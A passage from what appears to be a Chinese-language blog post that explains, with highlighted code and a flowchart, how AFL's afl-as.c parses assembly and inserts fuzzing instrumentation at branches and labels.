#ifdefs</span></span><br><span class="line"><span class="comment">       later on.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">        line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class="line"><span class="comment">       right after the branch (to instrument the not-taken path) and at the</span></span><br><span class="line"><span class="comment">       branch destination label (handled later on). */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">        ins_lines++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Label of some sort. This may be a branch destination, but we need to</span></span><br><span class="line"><span class="comment">       tread carefully and account for several different formatting</span></span><br><span class="line"><span class="comment">       conventions. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Everybody else: .L&lt;whatever&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">1</span>, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* An optimization is possible here by adding the code only if the</span></span><br><span class="line"><span class="comment">             label is mentioned in the code in contexts other than call / jmp.</span></span><br><span class="line"><span class="comment">             That said, this complicates the code by requiring two-pass</span></span><br><span class="line"><span class="comment">             processing (messy with stdin), and results in a speed gain</span></span><br><span class="line"><span class="comment">             typically under 10%, because compilers are generally pretty good</span></span><br><span class="line"><span class="comment">             about not generating spurious intra-function jumps.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We use deferred output chiefly to avoid disrupting</span></span><br><span class="line"><span class="comment">             .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class="line"><span class="comment">             MacOS X). */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!skip_next_label) instrument_next = <span class="number">1</span>; <span class="keyword">else</span> skip_next_label = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Function label (always instrumented, deferred mode). */</span></span><br><span class="line"></span><br><span class="line">        instrument_next = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ins_lines)</span><br><span class="line">    <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file) fclose(inf);</span><br><span class="line">  fclose(outf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!be_quiet) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ins_lines) WARNF(<span class="string">&quot;No instrumentation targets found%s.&quot;</span>,</span><br><span class="line">                          pass_thru ? <span class="string">&quot; (pass-thru mode)&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> OKF(<span class="string">&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;</span>,</span><br><span class="line">             ins_lines, use_64bit ? <span class="string">&quot;64&quot;</span> : <span class="string">&quot;32&quot;</span>,</span><br><span class="line">             getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>) ? <span class="string">&quot;hardened&quot;</span> : </span><br><span class="line">             (sanitizer ? <span class="string">&quot;ASAN/MSAN&quot;</span> : <span class="string">&quot;non-hardened&quot;</span>),</span><br><span class="line">             inst_ratio);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (input_file) &#123;</span><br><span class="line">    inf = <span class="built_in">fopen</span>(input_file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!inf) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class="line">&#125; <span class="keyword">else</span> inf = stdin;</span><br><span class="line"></span><br><span class="line">outfd = <span class="built_in">open</span>(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);</span><br><span class="line"><span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class="line">outf = <span class="built_in">fdopen</span>(outfd, <span class="string">&quot;w&quot;</span>);</span><br></pre></td></tr></table></figure><p>文件打开和初始化</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="built_in">fgets</span>(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">    instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">          <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">  instrument_next = <span class="number">0</span>;</span><br><span class="line">  ins_lines++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fputs</span>(line, outf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">      <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">    instr_ok = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">continue</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">    instr_ok = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">    line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class="line"><span class="comment">   right after the branch (to instrument the not-taken path) and at the</span></span><br><span class="line"><span class="comment">   branch destination label (handled later on). */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">            <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">    ins_lines++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是延迟插桩的机制，<code>fgets</code>的第一个参数<code>line</code>被定义为<code>static u8 line[MAX_LINE];</code>，宏<code>MAX_LINE</code>在<code>config.h</code>中被默认定义为8192。将<code>line</code>展开，可以得到<code>static uint8_t line[8192]</code>，也就是说<code>fgets</code>函数会读取<code>input_file</code>的一行代码存放到<code>line</code>数组（最多读取<code>MAX_LINE</code>个字符）：<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202507282100739.png" alt="image-20250728201118243"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202507282100740.png" alt="image-20250728201145951"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">    instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">            <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">    instrument_next = <span class="number">0</span>;</span><br><span class="line">    ins_lines++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发条件：</p><ol><li>不在直通模式 <code>(!pass_thru)</code></li><li>不跳过Intel语法 <code>(!skip_intel)</code></li><li>不跳过内联汇编 <code>(!skip_app)</code></li><li>不跳过代码段 <code>(!skip_csect)</code></li><li>在可插桩区域 <code>(instr_ok)</code></li><li>标记需要插桩 <code>(instrument_next)</code></li><li>当前行是指令 <code>(line[0] == &#39;\t&#39; &amp;&amp; isalpha(line[1]))</code></li></ol><p>如果满足以上所有条件，就会直接将插桩代码写入<code>outf</code>变量，然后再通过<code>fputs</code>函数写入对应文件中</p><p>如果是直通模式就会直接将汇编写入进入下一行了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fputs</span>(line, outf);</span><br><span class="line"><span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 检测.text段</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测其他段</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">        !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>段类型处理：</p><table><thead><tr><th align="left">段类型</th><th align="left">插桩状态</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">.text</td><td align="left">启用</td><td align="left">代码段，主要插桩目标</td></tr><tr><td align="left">__TEXT,__text</td><td align="left">启用</td><td align="left">macOS代码段</td></tr><tr><td align="left">.bss</td><td align="left">禁用</td><td align="left">未初始化数据段</td></tr><tr><td align="left">.data</td><td align="left">禁用</td><td align="left">已初始化数据段</td></tr><tr><td align="left">其他 .section</td><td align="left">禁用</td><td align="left">其他特殊段</td></tr></tbody></table><p>假设当前是<code>.text</code>段，那么会标记<code>instr_ok=1</code>，说明当前段是可以插桩的代码，那么<code>continue</code>之后，接下来的片段就是<code>.text</code>段即代码段的内容了，就可以进行插桩了</p><p>接下来就是特殊情况的处理：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">    <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>OpenBSD的特殊性：</p><ul><li><p>OpenBSD 将跳转表（jump tables）直接内联在代码中</p></li><li><p>跳转表是编译器生成的用于 switch 语句优化的数据结构</p></li><li><p>这些表被放在 .text 段中，但不应该被当作普通代码插桩</p></li></ul><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.p2align 4              # ← 这里会被检测到</span><br><span class="line">.L_jump_table:          # ← 这个标签会被跳过插桩</span><br><span class="line">    .quad .L1</span><br><span class="line">    .quad .L2</span><br><span class="line">    .quad .L3</span><br></pre></td></tr></table></figure><p>如果不进行特殊处理，会出现以下情况：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误的插桩（如果不特殊处理）</span></span><br><span class="line">.p2align <span class="number">4</span></span><br><span class="line"><span class="comment">/* AFL插桩代码 */</span>    # ← 这会破坏跳转表的对齐</span><br><span class="line">.L_jump_table:</span><br><span class="line">    .quad .L1</span><br></pre></td></tr></table></figure><p>会破坏p2align指令的对齐效果；跳转表是数据，不是代码，不应该被插桩；错误的插桩会导致跳转表寻址错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (strstr(line, &quot;.code&quot;)) &#123;</span><br><span class="line">    if (strstr(line, &quot;.code32&quot;)) skip_csect = use_64bit;</span><br><span class="line">    if (strstr(line, &quot;.code64&quot;)) skip_csect = !use_64bit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>混合架构代码：</p><ul><li><p>同一个汇编文件可能包含32位和64位代码段（比如armv8向前兼容）</p></li><li><p>在调试器（如GDB）中经常遇到</p></li><li><p>需要根据当前编译目标跳过不匹配的代码段</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>由于gcc本身默认使用AT&amp;T语法，AFL的插桩代码也是用AT&amp;T语法写的</p><blockquote><p>或许我可以写一个patch来兼容这部分（）</p></blockquote><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">    movl %eax, %ebx     # AT&amp;T语法，正常插桩</span><br><span class="line"></span><br><span class="line">.intel_syntax noprefix  # ← 检测到Intel语法</span><br><span class="line">    mov ebx, eax        # Intel语法，跳过插桩</span><br><span class="line">    jnz label1          # 跳过插桩</span><br><span class="line"></span><br><span class="line">.att_syntax prefix      # ← 检测到AT&amp;T语法</span><br><span class="line">    movl %eax, %ebx     # 恢复插桩</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内联汇编一般都是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">    # 普通C代码生成的汇编</span><br><span class="line">    pushq %rbp</span><br><span class="line">    </span><br><span class="line">#APP                    # ← 内联汇编开始标记</span><br><span class="line">    movl $<span class="number">42</span>, %eax      # 用户手写的汇编</span><br><span class="line">#NO_APP                 # ← 内联汇编结束标记</span><br><span class="line">    </span><br><span class="line">    # 继续普通汇编</span><br><span class="line">    popq %rbp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>因为内联汇编一般都是程序员手写的，不符合编译器生成代码的模式；同时<code>#</code>还检测了注释</p><p>接下来就是一个流程图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">开始</span><br><span class="line">  ↓</span><br><span class="line">打开输入/输出文件</span><br><span class="line">  ↓</span><br><span class="line">逐行读取汇编代码</span><br><span class="line">  ↓</span><br><span class="line">检查延迟插桩条件 → 是 → 插入插桩代码</span><br><span class="line">  ↓                     ↓</span><br><span class="line">输出当前行              更新计数器</span><br><span class="line">  ↓                     ↓</span><br><span class="line">直通模式? → 是 → 继续下一行</span><br><span class="line">  ↓</span><br><span class="line">检测段类型 → .text段 → 启用插桩</span><br><span class="line">  ↓           其他段 → 禁用插桩</span><br><span class="line">检测特殊情况</span><br><span class="line">  ↓</span><br><span class="line">跳过条件检查 → 是 → 继续下一行</span><br><span class="line">  ↓</span><br><span class="line">指令行? → 是 → 条件分支? → 是 → 概率插桩</span><br><span class="line">  ↓                        ↓</span><br><span class="line">标签行? → 是 → 分支标签? → 是 → 标记延迟插桩</span><br><span class="line">  ↓              函数标签? → 是 → 标记延迟插桩</span><br><span class="line">继续下一行</span><br><span class="line">  ↓</span><br><span class="line">文件结束? → 否 → 返回逐行读取</span><br><span class="line">  ↓</span><br><span class="line">添加主要载荷</span><br><span class="line">  ↓</span><br><span class="line">关闭文件，输出统计</span><br><span class="line">  ↓</span><br><span class="line">结束</span><br></pre></td></tr></table></figure><p>然后回到main函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(pid = fork())) &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">execvp</span>(as_params[<span class="number">0</span>], (<span class="type">char</span>**)as_params);</span><br><span class="line"><span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">waitpid</span>(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span 